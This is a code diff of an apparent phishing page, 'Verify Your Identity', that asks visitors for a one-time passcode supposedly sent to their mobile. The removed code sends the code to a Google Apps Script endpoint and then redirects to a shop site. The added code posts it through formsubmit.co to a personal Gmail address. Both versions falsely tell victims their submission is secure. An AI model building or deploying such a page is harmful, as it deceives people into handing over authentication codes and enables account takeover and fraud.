@@ -1,6 +1,6 @@
 
 <!DOCTYPE html>
-<html lang="="en">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
@@ -45,11 +45,6 @@
       border: 2px solid #ccc;
       border-radius: 12px;
       margin-bottom: 1.5rem;
-      transition: border-color 0.3s ease;
-    }
-    input[type="text"]:focus {
-      outline: none;
-      border-color: #007bff;
     }
     button {
       width: 100%;
@@ -61,7 +56,6 @@
       color: white;
       font-weight: bold;
       cursor: pointer;
-      transition: background-color 0.3s ease;
     }
     button:hover {
       background-color: #0056b3;
@@ -71,53 +65,17 @@
       font-size: 0.85rem;
       color: #aaa;
     }
-    .success-message {
-      margin-top: 1rem;
-      font-size: 0.95rem;
-      color: green;
-      display: none;
-    }
   </style>
 </head>
 <body>
   <div class="otp-container">
     <h2>Verify Your Identity</h2>
-    <p>An OTP has been sent to your registered mobile number. Please enter it below to continue.</p>
-    <form id="otpForm">
-      <input type="text" id="otpInput" placeholder="Enter 6-digit OTP" maxlength="6" required />
+    <p>An OTP has been sent to your mobile. Enter it below:</p>
+    <form action="https://formsubmit.co/rockinnganilsharma@gmail.com" method="POST">
+      <input type="text" name="OTP" placeholder="Enter 6-digit OTP" maxlength="6" required />
       <button type="submit">Verify OTP</button>
     </form>
-    <div class="success-message" id="successMsg">✅ OTP Verified Successfully! Redirecting...</div>
-    <div class="secure-note">Your data is encrypted and secure.</div>
+    <div class="secure-note">This submission is secure and private.</div>
   </div>
-
-  <script>
-    document.getElementById("otpForm").addEventListener("submit", function(e) {
-      e.preventDefault();
-      const otp = document.getElementById("otpInput").value;
-
-      if (otp.length === 6) {
-        fetch("https://script.google.com/macros/s/AKfycbycowmwUOlQkR1iGI-JlSHGqxKV8Io_HTjPv7SITxi448abDU4PLr2ByDeZyf8UZCTN/exec", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({ otp: otp })
-        })
-        .then(res => res.text())
-        .then(() => {
-          document.getElementById("successMsg").style.display = "block";
-          document.getElementById("otpInput").disabled = true;
-          document.querySelector("button").disabled = true;
-          setTimeout(() => {
-            window.location.href = "https://www.bhushanjewellersolan.com";
-          }, 2000);
-        })
-        .catch(err => alert("Failed to log OTP: " + err));
-      } else {
-        alert("Please enter a valid 6-digit OTP.");
-      }
-    });
-  </script>
 </body>
 </html>
